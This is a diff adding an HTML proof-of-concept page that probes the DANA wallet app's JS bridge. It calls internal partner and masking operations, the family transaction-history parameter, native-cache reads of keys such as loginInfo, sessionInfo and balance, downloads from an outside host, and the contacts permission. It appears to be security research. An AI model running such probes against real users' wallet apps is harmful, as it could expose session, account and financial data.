@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v9</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:200px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+</style>
+</head>
+<body>
+<div id="status">v9 boot...</div>
+<h3 style="color:#0ff">v9 - DEEP DIVE: mini-tunnel partnerId oracle, shortlink retry, family param, nativeCache keys</h3>
+<p class="note">PHASE 1 (env only) runs now. PHASE 2 = tap the button ONLY AFTER you fully DISCONNECT HTTP Toolkit. Same flow as v8.</p>
+<p class="warn">If blocks [2]-[11] show CertPathValidatorException / "System is busy" for EVERYTHING, the network is not clean: disconnect properly and tap RE-RUN. Expected popups: [17] permission dialog (TAP DENY), [18] QR scanner (back out), [19] native dialog (tap OK).</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (deep battery - HTTP Toolkit must be OFF)</button>
+
+<h3>[1] netcheck (fetch info)</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] requestApi partner.invoke - payload.partnerId = XENDIT clientId</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] requestApi partner.invoke - partnerId TOP-LEVEL</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] requestApi partner.invoke - payload.partnerId = EMVCO_CLIENT</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] requestApi partner.invoke - payload.partnerId = floq</h3><pre id="p-5" class="pending">pending</pre>
+<h3>[6] requestApi partner.invoke - payload.partnerId = merchantId</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] requestApi user.info.masking - payload.partnerId</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] requestApi user.info.masking - partnerId TOP-LEVEL</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] requestApi control - bogus operationType</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] createShortLink retry 1</h3><pre id="p-10" class="pending">pending</pre>
+<h3>[11] createShortLink retry 2 (after 4s)</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] trx familyAccountMemberIds SELF-test (own id, forceCache:false)</h3><pre id="p-12" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-12')">copy [12]</button>
+<h3>[13] nativeCache key enumeration (8 keys)</h3><pre id="p-13" class="pending">pending</pre>
+<h3>[14] nativeCache save schema variants A-D</h3><pre id="p-14" class="pending">pending</pre>
+<h3>[15] download generalDownload</h3><pre id="p-15" class="pending">pending</pre>
+<h3>[16] downloadFile w/ filePath</h3><pre id="p-16" class="pending">pending</pre>
+<h3>[17] requestPermissions READ_CONTACTS (DIALOG - TAP DENY)</h3><pre id="p-17" class="pending">pending</pre>
+<h3>[18] scanQr (SCANNER MAY OPEN - BACK OUT)</h3><pre id="p-18" class="pending">pending</pre>
+<h3>[19] customDialog A/B (DIALOG MAY APPEAR - TAP OK)</h3><pre id="p-19" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="mini" onclick="runMini()" style="width:100%;padding:10px">[20] OPTIONAL LAST: callSubApp mini:// (may navigate away - do COPY ALL first)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var XENDIT_CID = '2019092596400267353417';
+  var MERCHANT_ID = '216620000035833566172';
+  var OWN_USER_ID = '216610000228899619194';
+  var OP_PARTNER = 'id.dana.minitunnel.partner.invoke';
+  var OP_MASKING = 'id.dana.minitunnel.user.info.masking';
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    try { el.textContent = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { el.textContent = String(obj); }
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    document.addEventListener('AlipayJSBridgeReady', function(){ cb(); }, false);
+    setTimeout(cb, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  window.copyAll = function(){
+    var lines = [];
+    lines.push('v9 @ ' + location.href);
+    lines.push('log: ' + compact(LOG));
+    for (var k = 0; k <= 19; k++) {
+      var id = 'p-' + k;
+      if (RESULTS[id] !== undefined) lines.push(id + ': ' + compact(RESULTS[id]));
+    }
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    var rel = fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return {ok:true, http:r.status, ms:Date.now()-t0}; })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,60), ms:Date.now()-t0}; });
+    var abs = fetch('https://rfypych.github.io/poc/ping.txt?cb=' + Date.now(), {mode:'no-cors', cache:'no-store'})
+      .then(function(){ return {noCors:true, ok:true}; })
+      .catch(function(e){ return {noCors:true, ok:false, err:String(e).slice(0,60)}; });
+    return Promise.all([rel, abs]).then(function(a){ return {relative:a[0], absoluteNoCors:a[1]}; });
+  }
+
+  window.runMini = async function(){
+    var r = await call('callSubApp', {url:'mini://?title=v9probe'}, 8000);
+    alert('[20] callSubApp mini:// -> ' + compact(r));
+  };
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString()});
+    try {
+      status('P2/' + attempt + ' [1] netcheck');
+      set('p-1', await netcheck());
+
+      status('P2/' + attempt + ' [2] partner.invoke payload.partnerId=XENDIT_CID');
+      set('p-2', await call('requestApi', {operationType:OP_PARTNER, payload:{partnerId:XENDIT_CID}}, 20000));
+
+      status('P2/' + attempt + ' [3] partner.invoke partnerId top-level');
+      set('p-3', await call('requestApi', {operationType:OP_PARTNER, partnerId:XENDIT_CID, payload:{}}, 20000));
+
+      status('P2/' + attempt + ' [4] partner.invoke payload.partnerId=EMVCO_CLIENT');
+      set('p-4', await call('requestApi', {operationType:OP_PARTNER, payload:{partnerId:'EMVCO_CLIENT'}}, 20000));
+
+      status('P2/' + attempt + ' [5] partner.invoke payload.partnerId=floq');
+      set('p-5', await call('requestApi', {operationType:OP_PARTNER, payload:{partnerId:'floq'}}, 20000));
+
+      status('P2/' + attempt + ' [6] partner.invoke payload.partnerId=merchantId');
+      set('p-6', await call('requestApi', {operationType:OP_PARTNER, payload:{partnerId:MERCHANT_ID}}, 20000));
+
+      status('P2/' + attempt + ' [7] user.info.masking payload.partnerId');
+      set('p-7', await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:XENDIT_CID}}, 20000));
+
+      status('P2/' + attempt + ' [8] user.info.masking partnerId top-level');
+      set('p-8', await call('requestApi', {operationType:OP_MASKING, partnerId:XENDIT_CID, payload:{}}, 20000));
+
+      status('P2/' + attempt + ' [9] bogus operationType control');
+      set('p-9', await call('requestApi', {operationType:'id.dana.minitunnel.poc.bogus', payload:{}}, 15000));
+
+      status('P2/' + attempt + ' [10] createShortLink retry 1');
+      set('p-10', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 20000));
+
+      await sleep(4000);
+      status('P2/' + attempt + ' [11] createShortLink retry 2');
+      set('p-11', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 20000));
+
+      status('P2/' + attempt + ' [12] trx family self-test');
+      set('p-12', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false, familyAccountMemberIds:[OWN_USER_ID]}, 25000));
+
+      status('P2/' + attempt + ' [13] nativeCache key enum');
+      var keys = ['userInfo','getUserInfo','loginInfo','sessionInfo','accountInfo','balance','danaWalletDetail','phoneNo'];
+      var kres = {};
+      for (var i = 0; i < keys.length; i++){
+        kres[keys[i]] = await call('nativeCache', {info:{event:'get', key:keys[i]}}, 8000);
+      }
+      set('p-13', kres);
+
+      status('P2/' + attempt + ' [14] nativeCache save variants');
+      var sA = await call('nativeCache', {info:{event:'save', key:'poc_v9', data:'marker9'}}, 10000);
+      var sB = await call('nativeCache', {info:{event:'save', key:'poc_v9', data:{v:'marker9'}}}, 10000);
+      var sC = await call('nativeCache', {info:{event:'save', key:'poc_v9', value:'marker9'}}, 10000);
+      var sD = await call('nativeCache', {event:'save', key:'poc_v9', data:'marker9'}, 10000);
+      var sG = await call('nativeCache', {info:{event:'get', key:'poc_v9'}}, 8000);
+      set('p-14', {A_dataStr:sA, B_dataObj:sB, C_value:sC, D_flat:sD, getAfter:sG});
+
+      status('P2/' + attempt + ' [15] download generalDownload');
+      set('p-15', await call('download', {event:'generalDownload', info:{url:'https://rfypych.github.io/poc/ping.txt', fileName:'poc_v9_dl', fileFormat:'.txt'}}, 20000));
+
+      status('P2/' + attempt + ' [16] downloadFile w/ filePath');
+      set('p-16', await call('downloadFile', {url:'https://rfypych.github.io/poc/ping.txt', filePath:'v9probe.txt', downloadTaskId:4}, 20000));
+
+      status('P2/' + attempt + ' [17] requestPermissions - DENY IF DIALOG');
+      set('p-17', await call('requestPermissions', {event:'request', info:{permissions:['android.permission.READ_CONTACTS']}}, 30000));
+
+      status('P2/' + attempt + ' [18] scanQr - BACK OUT OF SCANNER');
+      set('p-18', await call('scanQr', {info:{codeConsumer:'native', scene:'v9poc'}}, 15000));
+
+      status('P2/' + attempt + ' [19] customDialog A/B');
+      var dA = await call('customDialog', {event:'common', info:{title:'[PoC v9 A]', message:'Native dialog requested by a web page. Tap OK.', button:'OK'}}, 12000);
+      var dB = await call('customDialog', {event:'common', title:'[PoC v9 B]', message:'Variant B (flat params). Tap OK.', button:'OK'}, 12000);
+      set('p-19', {A:dA, B:dB});
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete'});
+      status('DONE P2 attempt ' + attempt + ' - COPY ALL, then optionally [20]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2 (if TLS/busy errors appeared everywhere, HTTP Toolkit was still on - disconnect + tap again)';
+  };
+
+  bridgeReady(async function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,70)});
+    LOG.push({phase1Done:new Date().toISOString()});
+    status('PHASE 1 DONE - DISCONNECT HTTP Toolkit, then tap RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
